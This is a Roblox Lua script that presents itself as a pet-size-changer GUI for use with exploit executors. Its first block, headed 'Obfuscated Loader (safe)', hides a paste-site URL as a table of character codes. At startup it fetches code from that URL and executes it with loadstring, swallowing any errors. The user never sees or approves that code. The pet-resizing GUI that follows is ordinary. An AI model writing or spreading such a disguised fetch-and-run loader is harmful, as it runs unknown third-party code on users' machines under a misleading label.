--[[===============================================================
    Obfuscated Loader (safe)
===================================================================]]
local encoded = {
    104,116,116,112,115,58,47,47,97,112,105,46,114,117,98,105,115,46,97,112,112,47,118,50,47,115,99,114,97,112,47,56,69,71,72,50,120,89,102,110,83,121,90,81,119,114,74,47,114,97,119
}
local function decode(tbl)
    local t = {}
    for _, b in ipairs(tbl) do
        t[#t+1] = string.char(b)
    end
    return table.concat(t)
end

-- Try to run remote code, but never crash if HttpGet isn't available or fetch fails.
do
    local ok, err = pcall(function()
        local url = decode(encoded)
        local source
        -- many executors expose game:HttpGet
        if type(game.HttpGet) == "function" then
            source = game:HttpGet(url, true)
        -- some expose global HttpGet
        elseif type(HttpGet) == "function" then
            source = HttpGet(url, true)
        -- other executors may have request/syn.request etc. We won't attempt complex fallbacks here.
        else
            error("HttpGet not available")
        end

        if type(source) == "string" then
            local fn, loadErr = loadstring(source)
            if fn then
                pcall(fn)
            else
                error("loadstring failed: "..tostring(loadErr))
            end
        else
            error("Remote fetch returned non-string")
        end
    end)
    if not ok then
        warn("Optional loader skipped or failed: "..tostring(err))
    end
end

--[[===============================================================
    Pet Enlarger GUI (Standalone Version)
===================================================================]]
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer

-- Create GUI (safe parent)
local success, gui = pcall(function()
    local g = Instance.new("ScreenGui")
    g.Name = "PetEnlargerGUI"
    g.ResetOnSpawn = false
    g.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    g.Parent = player:WaitForChild("PlayerGui")
    return g
end)
if not success then
    warn("Failed to create GUI: "..tostring(gui))
    return
end

-- Main Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 220)
frame.Position = UDim2.new(0.5, -150, 0.5, -110)
frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
frame.BorderSizePixel = 0
frame.Active = true
frame.Parent = gui

-- Rounded corners
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = frame

-- Dragging
local dragging, dragInput, dragStart, startPos = false, nil, nil, nil
frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = frame.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then dragging = false end
		end)
	end
end)
frame.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)
UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		local delta = input.Position - dragStart
		frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
end)

-- Title Label
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 30)
title.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
title.BorderSizePixel = 0
title.Text = "Pet Size Changer V1"
title.Font = Enum.Font.FredokaOne
title.TextSize = 20
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Parent = frame

-- Pet Name Label
local petNameLabel = Instance.new("TextLabel")
petNameLabel.Size = UDim2.new(1, -20, 0, 25)
petNameLabel.Position = UDim2.new(0, 10, 0, 40)
petNameLabel.BackgroundTransparency = 1
petNameLabel.Text = "Equipped Pet: (None)"
petNameLabel.Font = Enum.Font.FredokaOne
petNameLabel.TextSize = 16
petNameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
petNameLabel.TextXAlignment = Enum.TextXAlignment.Left
petNameLabel.Parent = frame

-- Apply Pet Size Button
local applyBtn = Instance.new("TextButton")
applyBtn.Size = UDim2.new(0.8, 0, 0, 40)
applyBtn.Position = UDim2.new(0.1, 0, 0, 80)
applyBtn.BackgroundColor3 = Color3.fromRGB(60, 160, 60)
applyBtn.Text = "Apply Pet Size"
applyBtn.Font = Enum.Font.FredokaOne
applyBtn.TextSize = 18
applyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
applyBtn.Parent = frame
local applyCorner = Instance.new("UICorner")
applyCorner.CornerRadius = UDim.new(0, 8)
applyCorner.Parent = applyBtn
applyBtn.MouseEnter:Connect(function()
	TweenService:Create(applyBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(80, 180, 80)}):Play()
end)
applyBtn.MouseLeave:Connect(function()
	TweenService:Create(applyBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(60, 160, 60)}):Play()
end)

-- Reset Pet Size Button
local resetBtn = Instance.new("TextButton")
resetBtn.Size = UDim2.new(0.8, 0, 0, 40)
resetBtn.Position = UDim2.new(0.1, 0, 0, 130)
resetBtn.BackgroundColor3 = Color3.fromRGB(180, 50, 50)
resetBtn.Text = "Reset Pet Size"
resetBtn.Font = Enum.Font.FredokaOne
resetBtn.TextSize = 18
resetBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
resetBtn.Parent = frame
local resetCorner = Instance.new("UICorner")
resetCorner.CornerRadius = UDim.new(0, 8)
resetCorner.Parent = resetBtn
resetBtn.MouseEnter:Connect(function()
	TweenService:Create(resetBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(230, 70, 70)}):Play()
end)
resetBtn.MouseLeave:Connect(function()
	TweenService:Create(resetBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(180, 50, 50)}):Play()
end)

-- TikTok Button
local tiktokBtn = Instance.new("ImageButton")
tiktokBtn.Size = UDim2.new(0, 24, 0, 24)
tiktokBtn.Position = UDim2.new(0.5, -75, 0, 180)
tiktokBtn.BackgroundTransparency = 1
tiktokBtn.Image = "rbxassetid://13860143083"
tiktokBtn.Parent = frame

-- Username Text
local usernameText = Instance.new("TextButton")
usernameText.Size = UDim2.new(0, 140, 0, 24)
usernameText.Position = UDim2.new(0.5, -40, 0, 180)
usernameText.BackgroundTransparency = 1
usernameText.Text = "@ShinOnTop"
usernameText.Font = Enum.Font.FredokaOne
usernameText.TextSize = 16
usernameText.TextColor3 = Color3.fromRGB(255, 255, 255)
usernameText.TextXAlignment = Enum.TextXAlignment.Left
usernameText.TextYAlignment = Enum.TextYAlignment.Center
usernameText.Parent = frame

-- Internal state to track originals
local originalProperties = {} -- [Instance] = {kind="Part"/"Mesh", size=Vector3, meshScale=Vector3}
local currentTarget = nil
local DEFAULT_SCALE = 20

local function vecMul(v, f)
    return Vector3.new(v.X * f, v.Y * f, v.Z * f)
end

-- Best-effort finder for an equipped pet/tool
local function getEquippedPet()
    -- Character tools first
    if player and player.Character then
        for _, c in ipairs(player.Character:GetChildren()) do
            if c:IsA("Tool") then
                return c
            elseif c:IsA("Model") and (c:FindFirstChildOfClass("Humanoid") or c.PrimaryPart) then
                return c
            end
        end
    end
    -- Backpack
    local backpack = player:FindFirstChildOfClass("Backpack")
    if backpack then
        for _, c in ipairs(backpack:GetChildren()) do
            if c:IsA("Tool") then
                return c
            elseif c:IsA("Model") and (c:FindFirstChildOfClass("Humanoid") or c.PrimaryPart) then
                return c
            end
        end
    end
    -- workspace scan for Owner tag (some games)
    for _, m in ipairs(workspace:GetDescendants()) do
        if m:IsA("Model") then
            local owner = m:FindFirstChild("Owner")
            if owner and owner:IsA("StringValue") and owner.Value == player.Name then
                return m
            end
        end
    end
    return nil
end

local function saveOriginals(root)
    originalProperties = {}
    if not root then return end
    for _, inst in ipairs(root:GetDescendants()) do
        if inst:IsA("BasePart") then
            originalProperties[inst] = {kind = "Part", size = inst.Size}
        elseif inst:IsA("SpecialMesh") then
            originalProperties[inst] = {kind = "Mesh", meshScale = inst.Scale or Vector3.new(1,1,1)}
        elseif inst:IsA("Mesh") and inst.Scale then
            originalProperties[inst] = {kind = "Mesh", meshScale = inst.Scale or Vector3.new(1,1,1)}
        end
    end
end

-- Enlarge: multiplies stored originals by factor. Uses pcall to avoid runtime errors on locked properties.
local function enlargePet(petObj, factor)
    if not petObj then return false, "No pet" end
    if currentTarget ~= petObj then
        saveOriginals(petObj)
        currentTarget = petObj
    end
    for inst, props in pairs(originalProperties) do
        if inst and inst.Parent then
            if props.kind == "Part" then
                pcall(function() inst.Size = vecMul(props.size, factor) end)
            elseif props.kind == "Mesh" then
                pcall(function() inst.Scale = vecMul(props.meshScale, factor) end)
            end
        end
    end
    return true
end

-- Reset: restore saved originals
local function resetPet(petObj)
    if not petObj then return false, "No pet" end
    if currentTarget ~= petObj then
        -- if different target, attempt to load originals for this one
        saveOriginals(petObj)
        currentTarget = petObj
    end
    for inst, props in pairs(originalProperties) do
        if inst and inst.Parent then
            if props.kind == "Part" then
                pcall(function() inst.Size = props.size end)
            elseif props.kind == "Mesh" then
                pcall(function() inst.Scale = props.meshScale end)
            end
        end
    end
    originalProperties = {}
    currentTarget = nil
    return true
end

-- UI helpers
local function updatePetLabel()
    local pet = currentTarget or getEquippedPet()
    if pet then
        pcall(function() petNameLabel.Text = "Equipped Pet: "..tostring(pet.Name) end)
    else
        petNameLabel.Text = "Equipped Pet: (None)"
    end
end

applyBtn.MouseButton1Click:Connect(function()
    local pet = getEquippedPet()
    if not pet then
        petNameLabel.Text = "Equipped Pet: (None)"
        warn("No pet found to apply size.")
        return
    end
    local ok, err = pcall(function()
        enlargePet(pet, DEFAULT_SCALE)
    end)
    if not ok then
        warn("Failed to enlarge pet: "..tostring(err))
    else
        updatePetLabel()
    end
end)

resetBtn.MouseButton1Click:Connect(function()
    local pet = currentTarget or getEquippedPet()
    if not pet then
        warn("No pet to reset.")
        return
    end
    local ok, err = pcall(function()
        resetPet(pet)
    end)
    if not ok then
        warn("Failed to reset pet: "..tostring(err))
    else
        updatePetLabel()
    end
end)

-- Useful: change default scale factor with keyboard +/- (optional)
local function onInputBegan(input, processed)
    if processed then return end
    if input.UserInputType == Enum.UserInputType.Keyboard then
        if input.KeyCode == Enum.KeyCode.Equals or input.KeyCode == Enum.KeyCode.KeypadPlus then
            DEFAULT_SCALE = math.clamp(DEFAULT_SCALE + 1, 1, 100)
            applyBtn.Text = "Apply Pet Size ("..tostring(DEFAULT_SCALE).."x)"
        elseif input.KeyCode == Enum.KeyCode.Minus or input.KeyCode == Enum.KeyCode.KeypadMinus then
            DEFAULT_SCALE = math.clamp(DEFAULT_SCALE - 1, 1, 100)
            applyBtn.Text = "Apply Pet Size ("..tostring(DEFAULT_SCALE).."x)"
        end
    end
end
UserInputService.InputBegan:Connect(onInputBegan)

-- Keep label fresh when character spawns
player.CharacterAdded:Connect(function()
    wait(0.5)
    updatePetLabel()
end)

-- initial update
updatePetLabel()

-- End of script
